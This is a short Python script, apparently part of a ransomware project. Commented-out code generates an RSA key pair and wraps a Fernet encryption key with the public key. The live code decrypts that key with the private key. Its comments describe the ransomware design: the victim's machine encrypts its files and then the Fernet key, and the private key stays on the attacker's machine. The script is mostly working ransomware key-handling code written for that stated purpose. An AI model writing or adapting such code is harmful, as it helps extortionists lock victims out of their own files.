from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64

# Generates RSA Keys (Encryption/De-cryption) and Public/Private Keys
#key = RSA.generate(2048)

# private_key = key.export_key()
# with open('private.pem', 'wb') as f:
#     f.write(private_key)

# public_key = key.publickey().export_key()
# with open('public.pem', 'wb') as f:
#     f.write(public_key)



# Encryption using RSA Public key to encrypt the fernet encryption key
# print('> Encryption')

# Public RSA Key
# public_key = RSA.import_key(open('public.pem').read())  # Opening public.pem and assigning it to the public key
#
# with open('fernet_key.txt', 'rb') as f:  # Opening the fernet key text file and reading it
#     fernet_key = f.read()
#
#Public Encryptor
# public_encryptor = PKCS1_OAEP.new(public_key)  # Creates the public encryptor
#
#Encrypt Session key  # Opens fernet key and encrypts it
# with open('enc_fernet_key.txt', 'wb') as f:
#     encrypted_fernet_key = public_encryptor.encrypt(fernet_key)
#     f.write(encrypted_fernet_key)
#
# print(f'> Public Key: {public_key}')
# print(f'> Fernet Key: {fernet_key}')
# print(f'> Public encryptor: {public_encryptor}')
# print(f'> Encrypted fernet key: {encrypted_fernet_key}')
# print('> Encryption Completed\n')



# # Decryption using RSA private key to decrypt fernet encryption key
# # This key would remain on attacker machine and decryption would take place on that machine also
# # Only Victim machine would have fernet key/cryptor and RSA public key to encrypt that key after -
# it has encrypted all files etc.

print('> Decryption')

with open('enc_fernet_key.txt', 'rb') as f:  # Opening the encrypted fernet key and reading it in binary
    enc_fernet_key = f.read()

# Private RSA key
private_key = RSA.import_key(open('private.pem').read())  # Opening private.pem and assigning it to private key

# Private decryptor
private_decryptor = PKCS1_OAEP.new(private_key)

# Decrypted session key
decrypted_fernet_key = private_decryptor.decrypt(enc_fernet_key)  # This is going to decrypt the encrypted fernet key
with open('dec_fernet_key.txt', 'wb') as f:
    f.write(decrypted_fernet_key)

print(f'> Private key: {private_key}')
print(f'> Private Decryptor: {private_decryptor}')
print(f'> Decrypted fernet key: {decrypted_fernet_key}')
print('> Decryption Completed')